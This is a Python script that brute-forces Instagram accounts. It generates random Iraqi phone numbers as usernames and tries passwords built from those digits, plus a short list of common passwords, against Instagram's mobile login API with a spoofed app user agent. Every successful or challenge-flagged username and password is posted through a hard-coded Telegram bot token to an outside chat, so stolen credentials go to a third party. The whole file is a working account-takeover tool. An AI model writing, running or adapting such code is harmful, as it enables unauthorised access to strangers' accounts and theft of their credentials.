# - Hey, Bro This File Code By : Carlo 
# - Syntx : Python3
# - This File Is Free !!
# - Devlloper Channel : @IHFIH
# - Thanks You Bro Enjoy 
#==============================#
try:
  import random,requests,os
  import user_agent
  from user_agent import generate_user_agent
  import uuid
  from uuid import uuid4
except ModuleNotFoundError:
  os.system('pip install requests')
  os.system('pip install random')
  os.system('pip install user_agent')
  os.system('clear')
  
proxy = {
  "http": "socks4://180.211.183.178:60604",
  "https": "socks4://180.211.183.178:60604",
}

BBlack="\033[1;30m" # Black
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White

token = '1645801920:AAGMLF53Upb97MdS7_shpkaZwhS35WhITMk'
ID = '613389625'

print('    '+BCyan+'['+BPurple+'1'+BCyan+']'+BPurple+'0771' )
print('    '+BCyan+'['+BPurple+'2'+BCyan+']'+BPurple+'0781' )
print('    '+BCyan+'['+BPurple+'3'+BCyan+']'+BPurple+'0751' )
car = input('    '+BCyan+' - Chose One : ' )

if car =='1':
  print('  - wait has been started ')
  i = 0
  while True:
    number = '1234567890'
    us = str("".join(random.choice(number)for i in range(7)))
    username = '+964771'+us
    password = '0771' +us
    url = f'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
    uid = str(uuid4())
    data = {
    'uuid': uid,        
    'password': password,
    'username': username,           
    'device_id': uid,       
    'from_reg': 'false',
    '_csrftoken': 'missing',          
    'login_attempt_countn': '0'}     
    req_login = requests.post(url,headers=headers,data=data,allow_redirects=True)
    if ("logged_in_user") in req_login.text:
      print(BGreen+f' {username}:{password} Good ✅ ')
      requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝐻𝐸𝐿𝐿𝑂 𝑁𝐸𝑊 𝐴𝐶𝐶 𝐻𝑈𝑁𝑇𝐸𝐷 \n--------------------\n[=] 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸  : {username} \n[=] 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷  : {password}\n--------------------\n𝐹𝑅𝑂𝑀 : @uunnnnf     ''')
    elif '"message":"challenge_required","challenge"' in req_login.text:
      print(BYellow+f' {username}:{password} Secure 🔐 ')
      requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝐻𝐸𝐿𝐿𝑂 NEW SECORE \n--------------------\n[=] 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸  : {username} \n[=] 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷  : {password}\n--------------------\n𝐹𝑅𝑂𝑀 : @uunnnnf     ''')
      
    else:
      print(BRed+f' {username}:{password} Bad  ❌ ')
    i +=1

if car =='2':
  print('  - wait has been started ')
  i = 0
  while True:
    number = '1234567890'
    us = str("".join(random.choice(number)for i in range(7)))
    username = '+964781'+us
    password = '0781' +us
    url = f'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
    uid = str(uuid4())
    data = {
    'uuid': uid,        
    'password': password,
    'username': username,           
    'device_id': uid,       
    'from_reg': 'false',
    '_csrftoken': 'missing',          
    'login_attempt_countn': '0'}     
    req_login = requests.post(url,headers=headers,data=data,allow_redirects=True)
    if ("logged_in_user") in req_login.text:
      print(BGreen+f' {username}:{password} Good ✅ ')
      requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝐻𝐸𝐿𝐿𝑂 𝑁𝐸𝑊 𝐴𝐶𝐶 𝐻𝑈𝑁𝑇𝐸𝐷 \n--------------------\n[=] 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸  : {username} \n[=] 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷  : {password}\n--------------------\n𝐹𝑅𝑂𝑀 : @uunnnnf     ''')
    elif '"message":"challenge_required","challenge"' in req_login.text:
      print(BYellow+f' {username}:{password} Secure 🔐 ')
    else:
      print(BRed+f' {username}:{password} Bad  ❌ ')
    i +=1

if car =='3':
  print('  - wait has been started ')
  i = 0
  while True:
    number = '1234567890'
    us = str("".join(random.choice(number)for i in range(7)))
    username = '+964751'+us
    password = '0751' +us
    url = f'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
    uid = str(uuid4())
    data = {
    'uuid': uid,        
    'password': password,
    'username': username,           
    'device_id': uid,       
    'from_reg': 'false',
    '_csrftoken': 'missing',          
    'login_attempt_countn': '0'}     
    req_login = requests.post(url,headers=headers,data=data,allow_redirects=True)
    if ("logged_in_user") in req_login.text:
      print(BGreen+f' {username}:{password} Good ✅ ')
      requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝐻𝐸𝐿𝐿𝑂 𝑁𝐸𝑊 𝐴𝐶𝐶 𝐻𝑈𝑁𝑇𝐸𝐷 \n--------------------\n[=] 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸  : {username} \n[=] 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷  : {password}\n--------------------\n𝐹𝑅𝑂𝑀 : @uunnnnf     ''')
    elif '"message":"challenge_required","challenge"' in req_login.text:
      print(BYellow+f' {username}:{password} Secure 🔐 ')
    else:
      print(BRed+f' {username}:{password} Bad  ❌ ')
      
      
    us = str("".join(random.choice(number)for i in range(7)))
    passwords = ['1234567890', '12345678','1234554321','1234qwer','1122334455']
    
    for password in passwords:
          url = f'https://i.instagram.com/api/v1/accounts/login/'
          headers = {
          'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
              'Accept': "*/*",
              'Cookie': 'missing',
              'Accept-Encoding': 'gzip, deflate',
              'Accept-Language': 'en-US',
              'X-IG-Capabilities': '3brTvw==',
              'X-IG-Connection-Type': 'WIFI',
              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'Host': 'i.instagram.com'}
          uid = str(uuid4())
          data = {
          'uuid': uid,        
          'password': password,
          'username': username,           
          'device_id': uid,       
          'from_reg': 'false',
          '_csrftoken': 'missing',          
          'login_attempt_countn': '0'}     
          req_login = requests.post(url,headers=headers,data=data,allow_redirects=True)
          if ("logged_in_user") in req_login.text:
            print(BGreen+f' {username}:{password} Good ✅ ')
            requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝐻𝐸𝐿𝐿𝑂 𝑁𝐸𝑊 𝐴𝐶𝐶 𝐻𝑈𝑁𝑇𝐸𝐷 \n--------------------\n[=] 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸  : {username} \n[=] 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷  : {password}\n--------------------\n𝐹𝑅𝑂𝑀 : @uunnnnf     ''')
          elif '"message":"challenge_required","challenge"' in req_login.text:
            print(BYellow+f' {username}:{password} Secure 🔐 ')
          else:
            print(BRed+f' {username}:{password} Bad  ❌ ')
    i +=1


#=========================================================#